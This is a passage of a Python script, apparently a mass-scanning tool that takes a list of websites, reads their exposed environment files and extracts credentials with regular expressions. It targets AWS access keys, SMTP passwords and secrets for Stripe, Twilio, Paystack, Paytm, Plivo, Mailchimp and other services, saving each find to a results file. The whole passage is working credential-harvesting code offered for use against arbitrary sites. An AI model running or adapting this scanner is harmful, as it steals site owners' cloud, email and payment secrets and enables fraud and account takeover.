							open("results/amazon_smtp.txt","a+").write(f"[+] HOST={domain}{name}\n[+] MAIL_HOST={azmailhost}\n[+] MAIL_PORT={azmailport}\n[+] MAIL_USERNAME={azmailuser}\n[+] MAIL_PASSWORD={azmailpass}\n[+] MAIL_FROM_ADDRESS={azmailadd}\n[+] MAIL_FROM_NAME={azmailname}\n=========================\n")
							print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found AMAZON AWS!")
       
       
#################### Update November 2023 ####################
    
				#DO_SPACE
				dsh = re.findall(r'\sDO_SPACES_KEY=(.*?)(?=\s|$)', to_domain)
				dsh = ''.join(dsh)
				dssec = re.findall(r'\sDO_SPACES_SECRET=(.*?)(?=\s|$)', to_domain)
				dssec = ''.join(dssec)
				dsendpo = re.findall(r'\sDO_SPACES_ENDPOINT=(.*?)(?=\s|$)', to_domain)
				dsendpo = ''.join(dsendpo)
				if "DO_SPACES_KEY=" in to_domain and "DO_SPACES_SECRET=" in to_domain:	
					with thread_lock:
						open("results/do_space.txt","a+").write(f"[+] HOST={domain}\n[+] DO_SPACES_KEY={dsh}\n[+] DO_SPACE_SECRET={dssec}\n[+] DO_SPACES_ENDPOINT={dsendpo}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found DO_SPACE!")
				else:pass
      
				#RT_PLAID
				rtpc = re.findall(r'\sRT_PLAID_CLIENT_ID=(.*?)(?=\s|$)', to_domain)
				rtpc = ''.join(rtpc)
				rtsec = re.findall(r'\sRT_PLAID_SECRET=(.*?)(?=\s|$)', to_domain)
				rtsec = ''.join(rtsec)
				rtenv = re.findall(r'\sRT_PLAID_ENV=(.*?)(?=\s|$)', to_domain)
				rtenv = ''.join(rtenv)
				if "RT_PLAID_CLIENT_ID=" in to_domain and "RT_PLAID_SECRET=" in to_domain:	
					with thread_lock:
						open("results/rt_plaid.txt","a+").write(f"[+] HOST={domain}\n[+] RT_PLAID_CLIENT_ID={rtpc}\n[+] RT_PLAID_SECRET={rtsec}\n[+] RT_PLAID_ENV={rtenv}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found RT_PLAID!")
				else:pass

				#PUSHER_APP
				paid = re.findall(r'\sPUSHER_APP_ID=(.*?)(?=\s|$)', to_domain)
				paid = ''.join(paid)
				pakey = re.findall(r'\sPUSHER_APP_KEY=(.*?)(?=\s|$)', to_domain)
				pakey = ''.join(pakey)
				pasec = re.findall(r'\sPUSHER_APP_SECRET=(.*?)(?=\s|$)', to_domain)
				pasec = ''.join(pasec)
				paclu = re.findall(r'\sPUSHER_APP_CLUSTER=(.*?)(?=\s|$)', to_domain)
				paclu = ''.join(paclu)
				mappkey = re.findall(r'\sMIX_PUSHER_APP_KEY=(.*?)(?=\s|$)', to_domain)
				mappkey = ''.join(mappkey)
				mpaclu = re.findall(r'\sMIX_PUSHER_APP_CLUSTER=(.*?)(?=\s|$)', to_domain)
				mpaclu = ''.join(mpaclu)
				if "PUSHER_APP_KEY=" in to_domain and "USHER_APP_SECRET=" in to_domain:	
					with thread_lock:
						open("results/pusher.txt","a+").write(f"[+] HOST={domain}\n[+] PUSHER_APP_ID={paid}\n[+] PUSHER_APP_KEY={pakey}\n[+] PUSHER_APP_SECRET={pasec}\n[+] PUSHER_APP_CLUSTER={paclu}\n[+] MIX_PUSHER_APP_KEY={mappkey}\n[+] MIX_PUSHER_APP_CLUSTER={mpaclu}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found PUSHER!")
				else:pass
    
				#SSLCZ STORE
				sslid = re.findall(r'\sSSLCZ_STORE_ID=(.*?)(?=\s|$)', to_domain)
				sslid = ''.join(sslid)
				sslpass = re.findall(r'\sSSLCZ_STORE_PASSWD=(.*?)(?=\s|$)', to_domain)
				sslpass = ''.join(sslpass)
				if "SSLCZ_STORE_ID=" in to_domain and "SSLCZ_STORE_PASSWD=" in to_domain:	
					with thread_lock:
						open("results/SSLCZ_STORE.txt","a+").write(f"[+] HOST={domain}\n[+] SSLCZ_STORE_ID={sslid}\n[+] SSLCZ_STORE_PASSWD={sslpass}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found SSLCZ!")
				else:pass

				#GET_PAYSTACK
				ppkey = re.findall(r'\sPAYSTACK_PUBLIC_KEY=(.*?)(?=\s|$)', to_domain)
				ppkey = ''.join(ppkey)
				pskey = re.findall(r'\sPAYSTACK_SECRET_KEY=(.*?)(?=\s|$)', to_domain)
				pskey = ''.join(pskey)
				pmmail = re.findall(r'\sPAYSTACK_MERCHANT_EMAIL=(.*?)(?=\s|$)', to_domain)
				pmmail = ''.join(pmmail)
				ppurl = re.findall(r'\sPAYSTACK_PAYMENT_URL=(.*?)(?=\s|$)', to_domain)
				ppurl = ''.join(ppurl)
				if "PAYSTACK_PUBLIC_KEY=" in to_domain and "PAYSTACK_SECRET_KEY=" in to_domain:	
					with thread_lock:
						open("results/PAYSTACK.txt","a+").write(f"[+] HOST={domain}\n[+] PAYSTACK_PUBLIC_KEY={ppkey}\n[+] PAYSTACK_SECRET_KEY={pskey}\n[+] PAYSTACK_MERCHANT_EMAIL={pmmail}\n[+] PAYSTACK_PAYMENT_URL={ppurl}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found PAYSTACK!")
				else:pass

				#INSTAMOJO
				iakey = re.findall(r'\sINSTAMOJO_API_KEY=(.*?)(?=\s|$)', to_domain)
				iakey = ''.join(iakey)
				iatoken = re.findall(r'\sINSTAMOJO_AUTH_TOKEN=(.*?)(?=\s|$)', to_domain)
				iatoken = ''.join(iatoken)
				if "INSTAMOJO_API_KEY=" in to_domain and "INSTAMOJO_AUTH_TOKEN=" in to_domain:	
					with thread_lock:
						open("results/INSTAMOJO.txt","a+").write(f"[+] HOST={domain}\n[+] INSTAMOJO_API_KEY={iakey}\n[+] INSTAMOJO_AUTH_TOKEN={iatoken}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found INSTAMOJO!")
				else:pass

				#PAYTM
				pymenv = re.findall(r'\sPAYTM_ENVIRONMENT=(.*?)(?=\s|$)', to_domain)
				pymenv = ''.join(pymenv)
				pttmid = re.findall(r'\sPAYTM_MERCHANT_ID=(.*?)(?=\s|$)', to_domain)
				pttmid = ''.join(pttmid)
				ptmkey = re.findall(r'\sPAYTM_MERCHANT_KEY=(.*?)(?=\s|$)', to_domain)
				ptmkey = ''.join(ptmkey)
				ptmweb = re.findall(r'\sPAYTM_MERCHANT_WEBSITE=(.*?)(?=\s|$)', to_domain)
				ptmweb = ''.join(ptmweb)
				ptmchl = re.findall(r'\sPAYTM_CHANNEL=(.*?)(?=\s|$)', to_domain)
				ptmchl = ''.join(ptmchl)
				ptmtyp = re.findall(r'\sPAYTM_INDUSTRY_TYPE=(.*?)(?=\s|$)', to_domain)
				ptmtyp = ''.join(ptmtyp)
				if "PAYTM_ENVIRONMENT=" in to_domain and "PAYTM_MERCHANT_ID=" in to_domain:	
					with thread_lock:
						open("results/PAYTM.txt","a+").write(f"[+] HOST={domain}\n[+] PAYTM_ENVIRONMENT={pymenv}\n[+] PAYTM_MERCHANT_ID={pttmid}\n[+] PAYTM_MERCHANT_KEY={ptmkey}\n[+] PAYTM_MERCHANT_WEBSITE={ptmweb}\n[+] PAYTM_CHANNEL={ptmchl}\n[+] PAYTM_INDUSTRY_TYPE={ptmtyp}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found PAYTM!")
				else:pass
				
				#MAILCHIMP
				makey = re.findall(r'\sMAILCHIMP_API_KEY=(.*?)(?=\s|$)', to_domain)
				makey = ''.join(makey)
				mlid = re.findall(r'\sMAILCHIMP_LIST_ID=(.*?)(?=\s|$)', to_domain)
				mlid = ''.join(mlid)
				if "MAILCHIMP_API_KEY=" in to_domain and "MAILCHIMP_API_KEY=" in to_domain:	
					with thread_lock:
						open("results/MAILCHIMP.txt","a+").write(f"[+] HOST={domain}\n[+] MAILCHIMP_API_KEY={makey}\n[+] MAILCHIMP_LIST_ID={mlid}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found MAILCHIMP!")
				else:pass
###################### End Nov 2023 ####################
    
    
				#stripekey
				stkey = re.findall('\sSTRIPE_KEY=(.*?)\s', to_domain)
				stkey = ''.join(stkey)
				stksc = re.findall('\sSTRIPE_SECRET=(.*?)\s', to_domain)
				stksc = ''.join(stksc)
				if 'STRIPE_KEY' in to_domain:
					with thread_lock:
						open("results/aws_stripe.txt","a+").write(f"[+] HOST={domain}{name}\n[+] STRIPE_KEY={stkey}\n[+] STRIPE_SECRET={stksc}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found AWS_STRIPE!")
				else:pass
				###
				awsnskey = re.findall('\sAWS_SNS_KEY=(.*?)\s', to_domain)
				awsnskey = ''.join(awsnskey)
				awsnssec = re.findall('\sAWS_SNS_SECRET=(.*?)\s', to_domain)
				awsnssec = ''.join(awsnssec)
				awsnsfrom = re.findall('\sSMS_FROM=(.*?)\s', to_domain)
				awsnsfrom = ''.join(awsnsfrom)
				awsnsdriv = re.findall('\sSMS_DRIVER=(.*?)\s', to_domain)
				awsnsdriv = ''.join(awsnsdriv)
				if 'AWS_SNS_KEY' in to_domain:
					with thread_lock:
						open("results/aws_sns.txt","a+").write(f"[+] HOST={domain}{name}\n[+] AWS_SNS_KEY={awsnskey}\n[+] AWS_SNS_SECRET={awsnssec}\\n[+] SMS_FROM={awsnsfrom}\n[+] SMS_DRIVER={awsnsdriv}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found AWS_SNS]")
				else:pass
				#####
				stkey3 = re.findall('\sAWS_S3_KEY=(.*?)\s', to_domain)
				stkey3 = ''.join(stkey3)
				stksc3 = re.findall('\sAWS_S3_SECRET=(.*?)\s', to_domain)
				stksc3 = ''.join(stksc3)
				if 'AWS_S3_KEY' in to_domain:
					with thread_lock:
						open("results/aws_s3.txt","a+").write(f"[+] HOST={domain}{name}\n[+] AWS_S3_KEY={stkey3}\n[+] AWS_S3_SECRET={stksc3}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found AWS_S3!")
				else:pass
				#####
				awsexkey = re.findall('\sEXOTEL_API_KEY=(.*?)\s', to_domain)
				awsexkey = ''.join(awsexkey)
				awsextoken = re.findall('\sEXOTEL_API_TOKEN=(.*?)\s', to_domain)
				awsextoken = ''.join(awsextoken)
				awsexsid = re.findall('\sEXOTEL_API_SID=(.*?)\s', to_domain)
				awsexsid = ''.join(awsexsid)
				if 'EXOTEL_API_KEY' in to_domain:
					with thread_lock:
						open("results/aws_exotel.txt","a+").write(f"[+] HOST={domain}{name}\n[+] EXOTEL_API_KEY={awsexkey}\n[+] EXOTEL_API_TOKEN={awsextoken}\\n[+] EXOTEL_API_SID={awsexsid}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found EXOTEL]")
				else:pass
				#####
				smssendid = re.findall('\sSMS_API_SENDER_ID=(.*?)\s', to_domain)
				smssendid = ''.join(smssendid)
				smssendtoken = re.findall('\sSMS_API_TOKEN=(.*?)\s', to_domain)
				smssendtoken = ''.join(smssendtoken)
				smssendfrom = re.findall('\sSMS_API_FROM=(.*?)\s', to_domain)
				smssendfrom = ''.join(smssendfrom)
				if 'SMS_API_SENDER_ID' in to_domain:
					with thread_lock:
						open("results/sms_sender.txt","a+").write(f"[+] HOST={domain}{name}\n[+] SMS_API_SENDER_ID={awsexkey}\n[+] SMS_API_TOKEN={awsextoken}\\n[+] SMS_API_FROM={awsexsid}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found SMS SENDER]")
				else:pass
				#####
				awsoneid = re.findall('\sONESIGNAL_APP_ID=(.*?)\s', to_domain)
				awsoneid = ''.join(awsoneid)
				awsonekey = re.findall('\sONESIGNAL_REST_API_KEY=(.*?)\s', to_domain)
				awsonekey = ''.join(awsonekey)
				awsoneakey = re.findall('\sONESIGNAL_USER_AUTH_KEY=(.*?)\s', to_domain)
				awsoneakey = ''.join(awsoneakey)
				if 'ONESIGNAL_APP_ID' in to_domain:
					with thread_lock:
						open("results/aws_onesignal.txt","a+").write(f"[+] HOST={domain}{name}\n[+] ONESIGNAL_APP_ID={awsoneid}\n[+] ONESIGNAL_REST_API_KEY={awsonekey}\\n[+] ONESIGNAL_USER_AUTH_KEY={awsoneakey}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found ONESIGNAL]")
				else:pass
				#####
				tokboxdevkey = re.findall('\sTOKBOX_KEY_DEV=(.*?)\s', to_domain)
				tokboxdevkey = ''.join(tokboxdevkey)
				tokboxdevsec = re.findall('\sTOKBOX_SECRET_DEV=(.*?)\s', to_domain)
				tokboxdevsec = ''.join(tokboxdevsec)
				if 'TOKBOX_KEY_DEV' in to_domain:
					with thread_lock:
						open("results/aws_tokbox_dev.txt","a+").write(f"[+] HOST={domain}{name}\n[+] TOKBOX_KEY_DEV={tokboxdevkey}\n[+] TOKBOX_SECRET_DEV={tokboxdevsec}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found TOKBOX_DEV!")
				else:pass
				#####
				tokboxkey = re.findall('\sTOKBOX_KEY=(.*?)\s', to_domain)
				tokboxkey = ''.join(tokboxkey)
				tokboxsec = re.findall('\sTOKBOX_SECRET=(.*?)\s', to_domain)
				tokboxsec = ''.join(tokboxsec)
				if 'TOKBOX_KEY' in to_domain:
					with thread_lock:
						open("results/aws_tokbox.txt","a+").write(f"[+] HOST={domain}{name}\n[+] TOKBOX_KEY={tokboxkey}\n[+] TOKBOX_SECRET={tokboxsec}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found TOKBOX!")
				else:pass
				
				#aws_key
				awskeyid = re.findall('\sAWS_ACCESS_KEY_ID=(.*?)\s', to_domain)
				awskeyid = ''.join(awskeyid)
				awskeysec = re.findall('\sAWS_SECRET_ACCESS_KEY=(.*?)\s', to_domain)
				awskeysec = ''.join(awskeysec)
				awsregion = re.findall('\sAWS_DEFAULT_REGION=(.*?)\s', to_domain)
				awsregion = ''.join(awsregion)
				awsbucket = re.findall('\sAWS_BUCKET=(.*?)\s', to_domain)
				awsbucket = ''.join(awsbucket)
				if 'AWS_ACCESS_KEY_ID' not in to_domain:
					pass
				else:
					with thread_lock:
						open("results/aws_key.txt","a+").write(f"[+] HOST={domain}{name}\n[+] AWS_ACCESS_KEY_ID={awskeyid}\n[+] AWS_SECRET_ACCESS_KEY={awskeysec}\n[+] AWS_DEFAULT_REGION={awsregion}\n[+] AWS_BUCKET={awsbucket}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found AWS KEY!")
				#nexmo
				nkey = re.findall('\sNEXMO_KEY=(.*?)\s', to_domain)
				nkey = ''.join(nkey)
				nsecret = re.findall('\sNEXMO_SECRET=(.*?)\s', to_domain)
				nsecret = ''.join(nsecret)
				if 'NEXMO_KEY' not in to_domain:
					pass
				else:
					with thread_lock:
						open("results/nexmo.txt","a+").write(f"[+] HOST={domain}{name}\n[+] NEXMO_KEY={nkey}\n[+] NEXMO_SECRET={nsecret}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found NEXMO!")
				#plivo
				pid = re.findall('\sPLIVO_AUTH_ID=(.*?)\s', to_domain)
				pid = ''.join(pid)
				ptoken = re.findall('\sPLIVO_TOKEN=(.*?)\s', to_domain)
				ptoken = ''.join(ptoken)
				pnumr = re.findall('\sPLIVO_FROM_NUMBER=(.*?)\s', to_domain)
				pnumr = ''.join(pnumr)
				if 'PLIVO_AUTH_ID' not in to_domain:
					pass
				else:
					with thread_lock:
						open("results/plivo.txt","a+").write(f"[+] HOST={domain}{name}\n[+] PLIVO_AUTH_ID={pid}\n[+] PLIVO_TOKEN={ptoken}\n[+] PLIVO_FROM_NUMBER={pnumr}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found PLIVO!")
				#twilio
				tsid = re.findall('TWILIO_ACCOUNT_SID="(.*?)"', to_domain)
				tsid = ''.join(tsid)
				tapi_key = re.findall('TWILIO_API_KEY="(.*?)"', to_domain)
				tapi_key = ''.join(tapi_key)
				tapi_secret = re.findall('TWILIO_API_SECRET="(.*?)"', to_domain)
				tapi_secret = ''.join(tapi_secret)
				tchat = re.findall('TWILIO_CHAT_SERVICE_SID="(.*?)"', to_domain)
				tchat = ''.join(tchat)
				tnumber = re.findall('TWILIO_NUMBER="(.*?)"', to_domain)
				tnumber = ''.join(tnumber)
				ttoken = re.findall('TWILIO_AUTH_TOKEN="(.*?)"', to_domain)
				ttoken = ''.join(ttoken)
				if 'TWILIO_API_KEY' not in to_domain:
					pass
				else:
					with thread_lock:
						open("results/twilio.txt","a+").write(f"[+] HOST={domain}{name}\n[+] TWILIO_ACCOUNT_SID={tsid}\n[+] TWILIO_API_KEY={tapi_key}\n[+] TWILIO_API_SECRET={tapi_secret}\n[+] TWILIO_CHAT_SERVICE_SID={tchat}\n[+] TWILIO_NUMBER={tnumber}\n[+] TWILIO_AUTH_TOKEN={ttoken}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{name} {yellow}| {green}Found TWILIO!")	
			else:
					print(f"{blue}|- {white}http://{domain}{name} {yellow}| {red}Not Vuln!")
		except Exception as e:print(e)

def envInput(id_tele):
	domain = open(input(f"{red}[{white}#{red}]{white} LIST SITE : ")).readlines()
	thr = int(input(f"{red}[{white}#{red}]{white} THREADS (Max 50): "))
	ThreadPool = Pool(thr)
	ThreadPool.starmap(env, [(i, id_tele) for i in domain])
 
if __name__ == "__main__":
            time.sleep(1)
            clear()
            gui()
            envInput(id_tele)
      